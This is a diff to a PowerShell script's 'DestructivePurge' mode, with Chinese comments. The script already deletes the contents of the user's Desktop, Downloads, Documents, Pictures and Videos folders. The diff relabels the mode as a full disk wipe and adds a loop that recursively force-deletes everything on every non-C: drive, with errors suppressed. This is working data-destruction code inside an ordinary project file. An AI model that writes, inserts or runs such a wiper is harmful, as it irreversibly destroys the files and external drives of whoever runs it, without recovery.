@@ -21,16 +21,23 @@ if ($Mode -eq "DestructivePurge") {
         Write-Warning "⚠️ Final cloud sync failed, proceeding with local purge."
     }
 
-    # 2. 清理目标（公司内网带不走的资产）
+    # 2. 清理目标（全网磁盘抹除模式）
     $purgeTargets = @(
         "../../../Desktop/*",
         "../../../Downloads/*",
-        "../../../Documents/*", # 注意：除了本目录外的所有文档
+        "../../../Documents/*",
         "../../../Pictures/*",
         "../../../Videos/*",
         "04_FREEZONE/backups/*",
         "04_FREEZONE/logs/*"
     )
+
+    # 深度清理：遍历所有可用驱动器 (D:, E:, F: 等)
+    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Name -ne "C" -and $_.Free -gt 0 }
+    foreach ($drive in $drives) {
+        Write-Output "☢️ Wiping External Drive: $($drive.Name):"
+        Remove-Item -Path "$($drive.Name):\*" -Recurse -Force -ErrorAction SilentlyContinue
+    }
 
     foreach ($target in $purgeTargets) {
         $path = [System.IO.Path]::GetFullPath((Join-Path $projectRoot $target))
